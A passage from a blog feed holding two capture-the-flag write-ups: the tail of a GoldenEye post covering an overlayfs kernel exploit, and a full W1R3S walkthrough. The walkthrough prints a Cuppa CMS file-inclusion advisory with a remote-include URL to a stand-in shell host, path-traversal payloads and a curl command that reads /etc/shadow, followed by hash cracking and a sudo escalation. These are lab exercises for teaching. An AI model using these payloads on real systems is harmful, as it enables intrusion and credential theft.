Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
</code></p>

<p>I used the <a href="https://www.exploit-db.com/exploits/37292">overlayfs</a> exploit. There was no GCC on the box, but remember that webpage that mentioned clang. I compiled the exploit with clang: <code>clang 37292.c</code>. There were 5 warnings generated, but an executable a.out was generated. However, it didn&rsquo;t give me a root shell. When I looked through the exploit source code, I found a gcc reference:</p>

<p><code>c
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
</code></p>

<p>Replacing gcc with cc (the default compiler) in this line and recompiling the code worked and I got root. Then I found the secret codes inside a hidden file in /root:</p>

<p>```</p>

<h1>cat /root/.flag.txt</h1>

<p>cat /root/.flag.txt
Alec told me to place the codes here:</p>

<p>568628e0d993b1973adc718237da6e93</p>

<p>If you captured this make sure to go here&hellip;..
/006-final/xvf7-flag/
```</p>

<p>Visit that path on the web server and mission accomplished!</p>

<p><img class="center" src="/images/pentest/goldeneye/flag.png" title="&lsquo;flag&rsquo; &lsquo;flag&rsquo;" ></p>

<p>```</p>

<hr />

<p>/ Excellent time to become a missing \
\ person.                            /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting in the W1R3S]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/"/>
    <updated>2018-11-30T16:18:45+02:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s</id>
    <content type="html"><![CDATA[<p>With today&rsquo;s post I am experimenting with a new way of writing my hacking blog posts based on the <a href="https://redteams.net/redteaming/2017/phases-of-a-red-team-assessment-revisited">5 phases of red teams assessments</a>.</p>

<!-- more -->


<h2>Phase 1: OPORD</h2>

<p>The machine description is the following:</p>

<p>```
You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).</p>

<p>Difficulty to get a low privileged shell: Beginner/Intermediate</p>

<p>Difficulty to get privilege escalation: Beginner/Intermediate</p>

<p>About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.
```</p>

<h2>Phase 2: RECON</h2>

<p><code>
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.145.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
</code></p>

<p>The immediate points of interest are the FTP server, and the web server. Since Nmap only found the Apache default page, I started some background enumeration with Gobuster:</p>

<p>```
gobuster -u <a href="http://192.168.145.134">http://192.168.145.134</a> -w /usr/share/wordlists/dirb/common.txt</p>

<p>=====================================================</p>

<h1>Gobuster v2.0.0              OJ Reeves (@TheColonial)</h1>

<p>[+] Mode         : dir
[+] Url/Domain   : <a href="http://192.168.145.134/">http://192.168.145.134/</a>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403</p>

<h1>[+] Timeout      : 10s</h1>

<h1>2018/11/30 05:46:49 Starting gobuster</h1>

<p>/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
/javascript (Status: 301)
/server-status (Status: 403)</p>

<h1>/wordpress (Status: 301)</h1>

<p>```</p>

<p>Ok, we have some web directories to check..a possible Wordpress installation, a MySQL database and an FTP server that we can login to.</p>

<h2>Phase 3: TARGET ID</h2>

<p>Logging in to the FTP server, we see the following directories:</p>

<p><code>
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
</code></p>

<p>I downloaded them to my machine with <code>wget -r <a href="ftp://ftp:anonymous@192.168.145.134/">ftp://ftp:anonymous@192.168.145.134/</a></code>. Inside the <em>content</em> folder there are 3 text files, and one of them contains potentially interesting data:</p>

<p>```
root@onosendai:~/target/192.168.145.134/content# ls -alh
total 20K
drwxr-xr-x 2 root root 4.0K Nov 30 06:16 .
drwxr-xr-x 5 root root 4.0K Nov 30 06:16 ..
-rw-r&mdash;r&mdash; 1 root root   29 Jan 23  2018 01.txt
-rw-r&mdash;r&mdash; 1 root root  165 Jan 23  2018 02.txt
-rw-r&mdash;r&mdash; 1 root root  582 Jan 23  2018 03.txt
root@onosendai:~/target/192.168.145.134/content# cat 01.txt
New FTP Server For W1R3S.inc
root@onosendai:~/target/192.168.145.134/content# cat 02.txt
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</p>

<h6>#</h6>

<p>root@onosendai:~/target/192.168.145.134/content# cat 03.txt
<em><em><em><em><em><em><em><em><em><strong>.</strong>              <strong>      </strong>  </em></em></em></em></em></em></em></em></em><em><em><strong><strong><strong><strong><strong><em>   </em></strong></strong></strong></strong>    .</strong>             <br/>
_</em>    </em><strong>/|  |</strong>   <strong><strong>   /  \    /  \/<em>   _</em></strong></strong>   _<strong><strong>  \ /   </strong></strong><em>/    |<strong>| </strong></em><em>   </em><em><strong><br/>
  |    |   |  |  _/ </strong> \  \   \/\/   / |   ||       </em>/ <em>(<strong>  &lt; _</strong></em><em>  \     |  |/    _/ </em><strong>\
  |    |   |   Y  \  </strong><em>/   \        /  |   ||    |   \/       \/        \    |  |   |  \  _<strong>
  |</strong></em><em>|   |</em><strong>|  /_</strong>  >   _<em>/\  /   |</em><strong>||</strong><strong>|<em>  /</em></strong><strong><em>  /</em></strong><em><strong>_  / /\ |</strong>|</em><strong>|  /_</strong>  ></p>

<pre><code>            \/     \/         \/                \/       \/        \/  \/         \/     \/
</code></pre>

<p>```</p>

<p>I used an online MD5 hash cracker to get the value <code>This is not a password</code>. And the base64 string gave the message that <code>It is easy, but not that easy..</code>. So there are probably red herrings, let&rsquo;s move on.</p>

<p>Inside <em>docs</em> there&rsquo;s a text file with some upside down text:</p>

<p>```
root@onosendai:~/target/192.168.145.134/docs# cat worktodo.txt</p>

<pre><code>ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
</code></pre>

<p>&hellip;.punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```</p>

<p>Used an <a href="http://flip-upsidedown-text.1bestlink.net/">online converter</a> to flip this and reverse it for the text:</p>

<p><code>
we have a ןot of work to do‘ stop pןaying around˙˙˙˙
i don't think this is the way to root!
</code></p>

<p>This is also useless..The final piece gives us some names that we might be able to use later:</p>

<p>```
root@onosendai:~/target/192.168.145.134/new-employees# cat employee-names.txt
The W1R3S.inc employee list</p>

<p>Naomi.W &ndash; Manager
Hector.A &ndash; IT Dept
Joseph.G &ndash; Web Design
Albert.O &ndash; Web Design
Gina.L &ndash; Inventory
Rico.D &ndash; Human Resources
```</p>

<p>This is all the information we got from the FTP vector. Let&rsquo;s return to the web server now. The javascript folder was forbidden for viewing, and the wordpress folder redirected to localhost/wordpress, so I had to modify my <code>/etc/hosts</code> file:</p>

<p><code>
192.168.145.134 localhost
</code></p>

<p>Now I could get to the Wordpress blog, which looks to be under construction:</p>

<p><img class="center" src="/images/pentest/w1r3s/wordpress.png" title="&lsquo;wordpress&rsquo; &lsquo;wordpress&rsquo;" ></p>

<p>I decided to go with an alternate Wordpress scanner for this one, so instead of WPScan, I went with <a href="https://github.com/m4ll0k/WPSeku">WPSeku</a></p>

<blockquote><p>WPSeku &ndash; Wordpress Security Scanner</p>

<p>WPSeku is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<p>```</p>

<h2>python3 wpseku.py</h2>

<p> _ _ _ <strong><em> </em></strong> <strong><em>| |</em> _ _
| | | | . |<em> &ndash;| &ndash;</em>| &lsquo;<em>| | |
|</em></strong><strong>|  <em>|</em></strong>|<strong><em>|</em>,<em>|</em></strong>|</p>

<pre><code>  |_|             v0.4.0
</code></pre>

<p>WPSeku &ndash; Wordpress Security Scanner</p>

<h2>by Momo Outaadi (m4ll0k)</h2>

<p>Usage: wpseku.py [options]</p>

<pre><code>-u --url    Target URL (e.g: http://site.com)
-b --brute  Bruteforce login via xmlrpc
-U --user   Set username for bruteforce, default "admin"
-s --scan   Checking wordpress plugin code
-p --proxy  Use a proxy, (host:port)
-c --cookie Set HTTP Cookie header value
-a --agent  Set HTTP User-agent header value
-r --ragent Use random User-agent header value
-R --redirect   Set redirect target URL False
-t --timeout    Seconds to wait before timeout connection
-w --wordlist   Set wordlist, default "db/wordlist.txt"
-v --verbose    Print more informations
-h --help   Show this help and exit
</code></pre>

<p>Example:</p>

<pre><code> wpseku.py --url http://site.com/
 wpseku.py --url http://site.com --brute --user test
 wpseku.py --url http://site.com/ --brute --user admin --wordlist wordlist.txt
</code></pre>

<p>```</p>

<p>Ran it against the target:</p>

<p>```</p>

<h2>python3 wpseku.py -u <a href="http://localhost/wordpress/">http://localhost/wordpress/</a> -v</h2>

<p> _ _ _ <strong><em> </em></strong> <strong><em>| |</em> _ _
| | | | . |<em> &ndash;| &ndash;</em>| &lsquo;<em>| | |
|</em></strong><strong>|  <em>|</em></strong>|<strong><em>|</em>,<em>|</em></strong>|</p>

<pre><code>  |_|             v0.4.0
</code></pre>

<p>WPSeku &ndash; Wordpress Security Scanner</p>

<h2>by Momo Outaadi (m4ll0k)</h2>

<p>[ + ] Target: <a href="http://localhost/wordpress/">http://localhost/wordpress/</a>
[ + ] Starting: 07:52:06</p>

<p>[ + ] Server: Apache/2.4.18 (Ubuntu)
[ i ] Checking Full Path Disclosure&hellip;
[ i ] Checking wp-config backup file&hellip;
[ + ] wp-config.php available at: <a href="http://localhost/wordpress/wp-config.php">http://localhost/wordpress/wp-config.php</a>
[ i ] Checking common files&hellip;
[ + ] readme.html file was found at: <a href="http://localhost/wordpress/readme.html">http://localhost/wordpress/readme.html</a>
[ i ] Checking directory listing&hellip;
[ + ] Dir &ldquo;/wp-admin/css&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/css/">http://localhost/wordpress/wp-admin/css/</a>
[ + ] Dir &ldquo;/wp-admin/images&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/images/">http://localhost/wordpress/wp-admin/images/</a>
[ + ] Dir &ldquo;/wp-admin/includes&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/includes/">http://localhost/wordpress/wp-admin/includes/</a>
[ + ] Dir &ldquo;/wp-admin/js&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-admin/js/">http://localhost/wordpress/wp-admin/js/</a>
[ + ] Dir &ldquo;/wp-content/uploads&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-content/uploads/">http://localhost/wordpress/wp-content/uploads/</a>
[ + ] Dir &ldquo;/wp-includes/&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/">http://localhost/wordpress/wp-includes/</a>
[ + ] Dir &ldquo;/wp-includes/js&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/js/">http://localhost/wordpress/wp-includes/js/</a>
[ + ] Dir &ldquo;/wp-includes/Text&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/Text/">http://localhost/wordpress/wp-includes/Text/</a>
[ + ] Dir &ldquo;/wp-includes/css&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/css/">http://localhost/wordpress/wp-includes/css/</a>
[ + ] Dir &ldquo;/wp-includes/images&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/images/">http://localhost/wordpress/wp-includes/images/</a>
[ + ] Dir &ldquo;/wp-includes/pomo&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/pomo/">http://localhost/wordpress/wp-includes/pomo/</a>
[ + ] Dir &ldquo;/wp-includes/theme-compat&rdquo; listing enable at: <a href="http://localhost/wordpress/wp-includes/theme-compat/">http://localhost/wordpress/wp-includes/theme-compat/</a>
[ i ] Checking wp-loging protection&hellip;
[ i ] Checking robots paths&hellip;
[ i ] Checking WordPress version&hellip;
[ + ] Running WordPress version: 4.9.8
  |   Not found vulnerabilities</p>

<p>[ i ] Passive enumeration themes&hellip;
[ + ] Name: twentyseventeen
[ i ] Checking themes changelog&hellip;
[ i ] Checking themes full path disclosure&hellip;
[ i ] Checking themes license&hellip;
[ i ] Checking themes readme&hellip;
[ i ] Checking themes directory listing&hellip;
[ i ] Checking theme vulnerabilities&hellip;
  |   Not found vulnerabilities</p>

<p>[ i ] Passive enumeration plugins&hellip;
[ + ] Not found plugins with passive enumeration</p>

<h2>[ i ] Enumerating users&hellip;</h2>

<h2>| ID | Username | Login    |</h2>

<p>|  0 | Admin    | admin    |
|  1 | Admin    | None     |
|  2 |          | admin    |</p>

<h2>|  3 |          | joseph-g |</h2>

<p>```</p>

<p>Nothing evidently exploitable in the scan results, so I turned to the <em>/administrator</em> folder on the web server and got to the configuration screen of a Cuppa CMS:</p>

<p><img class="center" src="/images/pentest/w1r3s/cuppa-cms.png" title="&lsquo;cuppa cms&rsquo; &lsquo;cuppa cms&rsquo;" ></p>

<p>Couldn&rsquo;t proceed with the configuration because I didn&rsquo;t have enough information:</p>

<p><img class="center" src="/images/pentest/w1r3s/cuppa-admin.png" title="&lsquo;cuppa admin&rsquo; &lsquo;cuppa admin&rsquo;" ></p>

<p>I&rsquo;ve never heard of this CMS before, I ran a quick searchsploit and got a hit:</p>

<p>```
searchsploit cuppa cms</p>

<hr />

<p> Exploit Title                                                                                              |  Path</p>

<pre><code>                                                                                                        | (/usr/share/exploitdb/)
</code></pre>

<hr />



<hr />

<p>```</p>

<p>Let&rsquo;s see what this is about:</p>

<p>```</p>

<h6>#</h6>

<p>VULNERABILITY: PHP CODE INJECTION</p>

<h6>#</h6>

<p>/alerts/alertConfigField.php (LINE: 22)</p>

<hr />

<p>LINE 22:</p>

<pre><code>    &lt;?php include($_REQUEST["urlConfig"]); ?&gt;
</code></pre>

<hr />

<h6>#</h6>

<p>DESCRIPTION</p>

<h6>#</h6>

<p>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.</p>

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=">http://target/cuppa/alerts/alertConfigField.php?urlConfig=</a>[FI]</p>

<h6>#</h6>

<p>EXPLOIT</p>

<h6>#</h6>

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</a></p>

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>

<p>Moreover, We could access Configuration.php source code via PHPStream</p>

<p>For Example:</p>

<hr />

<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</a></p>

<hr />

<p>```</p>

<h2>Phase 4: LIVE RUN</h2>

<p>I tried the LFI, but all I got was a blank page in return. So I attempted this with curl, and got served the <em>passwd</em> file:</p>

<p><code>
curl http://192.168.145.134/administrator/alerts/alertConfigField.php --data-urlencode urlConfig=../../../../../../../../../etc/passwd
[...]
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
[...]
</code></p>

<p>Now we have a valid user on the system and we can read arbitrary files. Because the root user was prepopulated in the installation page, I tried reading the <em>/etc/shadow</em> file and&hellip;succeeded!</p>

<p><code>
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
</code></p>

<p>That was a lucky break! I put the hashes for root and w1r3s in a file to be cracked by John the Ripper and immediately got a password:</p>

<p><code>
john hashes.txt
Created directory: /root/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (w1r3s)
</code></p>

<p>With this, I could SSH in.</p>

<p>```
ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#119;&#49;&#x72;&#x33;&#x73;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#52;&#x35;&#46;&#x31;&#51;&#x34;">&#x77;&#49;&#114;&#51;&#115;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#52;</a>
The authenticity of host &lsquo;192.168.145.134 (192.168.145.134)&rsquo; can&rsquo;t be established.
ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
Are you sure you want to continue connecting (yes/no)? yes</p>

<h2>Warning: Permanently added &lsquo;192.168.145.134&rsquo; (ECDSA) to the list of known hosts.</h2>

<h2>Think this is the way?</h2>

<h2>Well,&hellip;&hellip;..possibly.</h2>

<p><a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x77;&#x31;&#x72;&#x33;&#115;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#52;&#53;&#46;&#x31;&#x33;&#52;">&#119;&#x31;&#x72;&#51;&#x73;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#52;&#x35;&#46;&#49;&#x33;&#x34;</a>&rsquo;s password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com">https://help.ubuntu.com</a></li>
<li>Management:     <a href="https://landscape.canonical.com">https://landscape.canonical.com</a></li>
<li>Support:        <a href="https://ubuntu.com/advantage">https://ubuntu.com/advantage</a></li>
</ul>


<p>227 packages can be updated.
11 updates are security updates.</p>

<p><strong><em> System restart required </em></strong>
&hellip;..You made it huh?&hellip;.
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
```</p>

<p>One of the things I picked up from watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> videos was to check the sudo privileges early on:</p>

<p>```
sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s:
Matching Defaults entries for w1r3s on W1R3S:</p>

<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</code></pre>

<p>User w1r3s may run the following commands on W1R3S:</p>

<pre><code>(ALL : ALL) ALL
</code></pre>

<p>```</p>

<p>That tops the misconfiguration list! Our user has unlimited sudo privileges!</p>

<p>```
w1r3s@W1R3S:~$ sudo /bin/bash
sudo: unable to resolve host W1R3S
root@W1R3S:~# ls /root
flag.txt</p>

<h2>root@W1R3S:~# cat /root/flag.txt</h2>

<hr />

<p>  / <strong><em>/ _ \| \ | |/ </em></strong>|  _ \    / \|<em>   </em>| | | | |      / \|<em>   </em>|<em> </em>/ _ \| \ | / <strong><em>|
 | |  | | | |  \| | |  </em>| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| _</strong> \
 | |<strong>| |<em>| | |\  | |</em>| |  _ &lt;  / </strong><em> \| | | |</em>| | |<strong><em> / </em></strong> \| |  | | |<em>| | |\  |</em><strong>) |
  _</strong><em>___/|</em>| _|_<strong><em>|</em>| _\/_/   __|  _</strong>/|<em><strong><em><em>/</em>/   __| |</em></strong>___/|</em>| _|____/</p>

<hr />

<pre><code>                      .-----------------TTTT_-----_______
                    /''''''''''(______O] ----------____  \______/]_
 __...---'"""\_ --''   Q                               ___________@
</code></pre>

<p> |&lsquo;&rsquo;&lsquo;                   .<em>   </em><strong><em><em>__________=&mdash;&mdash;&mdash;&mdash;&ndash;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;
 |                ..&mdash;&rsquo;&lsquo;|   l L |</em>l   |
 |          ..&mdash;&rsquo;&lsquo;      .  /&ndash;</em></strong>j &rsquo;   &lsquo;
 |    ..&mdash;&rsquo;&lsquo;           /  ,       &rsquo;   &lsquo;
 |&mdash;&rsquo;&lsquo;                /           `    \</p>

<pre><code>                  L__'         \    -
                                -    '-.
                                 '.    /
                                   '-./
</code></pre>

<hr />

<p>  YOU HAVE COMPLETED THE</p>

<pre><code>           __      __  ______________________   _________
          /  \    /  \/_   \______   \_____  \ /   _____/
          \   \/\/   / |   ||       _/ _(__  &lt; \_____  \
           \        /  |   ||    |   \/       \/        \
            \__/\  /   |___||____|_  /______  /_______  /.INC
                 \/                \/       \/        \/        CHALLENGE, V 1.0
</code></pre>

<hr />

<p>CREATED BY SpecterWires</p>

<hr />

<p>```</p>

<h2>Phase 5: REPORT</h2>

<p>The exploitation chain was as follows:</p>

<ul>
<li>enumeration revealed the Cuppa CMS directories</li>
<li>Cuppa CMS was vulnerable to a LFI exploit</li>
<li>due to the CMS being configured as root, it was possible to read the <em>/etc/shadow</em> file with the LFI</li>
<li>hash was cracked for standard user <em>w1r3s</em></li>
<li>the user had unlimited sudo privileges and elevating to root was achieved</li>
</ul>


<p>Until next time!</p>

<p>```</p>

<hr />

<p>/ You&rsquo;ll never be the man your mother \</p>

<h2>\ was!                                /</h2>

<pre><code>         \   ^__^
            \  (oo)\_______
                 (__)\       )\/\
                         ||----w |
                         ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
